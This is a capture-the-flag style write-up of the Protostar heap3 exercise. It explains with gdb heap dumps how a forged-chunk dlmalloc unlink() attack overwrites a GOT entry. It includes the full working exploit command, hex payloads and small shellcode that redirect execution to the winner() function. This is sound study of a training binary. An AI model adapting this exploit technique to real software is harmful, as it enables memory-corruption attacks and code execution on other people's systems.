		EXPLOITATION
user@protostar:/tmp$ ./heap3 $(python -c 'print "AAAAAAAAAAAA\xb8\x64\x88\x04\x08\xff\xd0"') $(python -c 'print "B"*36+"\x65"') $(python -c 'print "C"*92+"\xfc\xff\xff\xff"+"\xfc\xff\xff\xff"+"\x1c\xb1\x04\x08"+"\x14\xc0\x04\x08"')
that wasn't too bad now, was it? @ 1531353203
Segmentation fault


		WRITEUP DLMALLOC UNLINK() VULNERABILITY

0. Special thanks for this websites references than this was very useful for me:
https://www.youtube.com/watch?v=HWhzH--89UQ
http://www.pwntester.com/blog/2013/12/20/protostar-heap0-4-write-ups/
https://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/

1. We take some bp after all malloc, all strcpy and all free calls.
(gdb) break *0x080488be
Breakpoint 1 at 0x80488be: file heap3/heap3.c, line 18.
(gdb) break *0x0804890a
Breakpoint 2 at 0x804890a: file heap3/heap3.c, line 24.
(gdb) break *0x0804892e
Breakpoint 3 at 0x804892e: file heap3/heap3.c, line 28.
(gdb) run AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
Starting program: /tmp/heap3 AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC


2.Breakpoint 1, 0x080488be in main (argc=4, argv=0xbffff854) at heap3/heap3.c:18
18	heap3/heap3.c: No such file or directory.
	in heap3/heap3.c
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000029	0x00000000	0x00000000
0x804c010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000029	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000f89

If you look prev_size is 0 and size it is 40 bytes (0x29). The least significant bit means when it is set to 1 that the previous chunk is in use. We can allocate 32 bytes por data.


3. Breakpoint 2, main (argc=4, argv=0xbffff854) at heap3/heap3.c:24
24	in heap3/heap3.c
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x00000000	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c030:	0x42424242	0x42424242	0x42424242	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000029	0x43434343	0x43434343
0x804c060:	0x43434343	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000f89

We can see how strcpy copied all data as argument when we passed it into allocated memory.


4. Breakpoint 3, main (argc=4, argv=0xbffff854) at heap3/heap3.c:28
28	in heap3/heap3.c
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000029	0x0804c028	0x41414141
0x804c010:	0x41414141	0x00000000	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c030:	0x0804c050	0x42424242	0x42424242	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000029	0x00000000	0x43434343
0x804c060:	0x43434343	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000f89

There was some weird, if you realize we don't have our prev_size with some different data to zero so what happend? because it should contain the size of the previous block...

However, fd points to the correct next block (0x0804c028) this memory address is the prev_size of second chunk. Also, the least significant bit of size haven't been set to indicate the previous chunk is free.

So if you see all of these are 0x29 and the next block didn't bit set to 0x30...so this is indicate than the next block didn't say that the previous block is in use.
But ok, if we could free the first chunk because the next will be the same so 0x29 and not bit set.
Also, the third chunk or block it is the same, 0x29 not the least significant bit set. 
So the algorithm consolidate and link the two blocks before so just one and second block to be freed because didn't use it due to the least significant bit it wasn't set. 

Ok, we need to fool free(b) for that block is in use so just in third block add 0x65 with least significant bit set to one. So we just need in the second argument send to many B characters with \x65 in the end right, cool. So our buffer it is like that: B*36+\x65

So because of choose 0x65 (101 bytes) it will be the size of the next block so third block. Well, we need use third argument to fill 100 bytes an overwrite the "fourth" o just the next block and we need a negative value to fool that the size of fourth is -4 bytes(0xfffffffc) to point that the previous size wasn't in use because it wasn't not bit set, also use othe (0xfffffffc). So the payload it is like this:
C*100+\xfc\xff\xff\xff+\xfc\xff\xff\xff. Therefore, we just fool free to think that the previous block it isn't use and unlink trigger with the first block and we will be have write fd and bk pointer. Boom!. 
We will write fd to point puts function GOT and bk to point the first in not use block "A" and that means redirect code execution to get our function winner(). So we need write Global Offset Address (GOT), so fd=\x1c\xb1\x04\x08 that it is GOT-12 because we will point with bk to heap address +12 in first block. bk=\x14\xc0\x04\x08. 
Finally we need to make a shellcode that calls winner() functions in first argument, so thats means in A.
So we will use this website: https://defuse.ca/online-x86-assembler.htm#disassembly
And this is the assembly:       mov eax, 0x8048854 #winner memory address
				call eax

Junk+Shellcode: AAAAAAAAAAAA\xb8\x64\x88\x04\x08\xff\xd0


Heap allocated memory just right configurate:

(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x048864b8	0x00d0ff08	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c030:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x42424242	0x00000065	0x43434343	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c080:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c090:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c0a0:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c0b0:	0x43434343	0xfffffffc	0xfffffffc	0x0804b11c
0x804c0c0:	0x0804c014	0x00000000	0x00000000	0x00000000
0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.

Breakpoint 3, main (argc=4, argv=0xbffff7d4) at heap3/heap3.c:28
28	in heap3/heap3.c
(gdb) c
Continuing.
that wasn't too bad now, was it? @ 1531352824

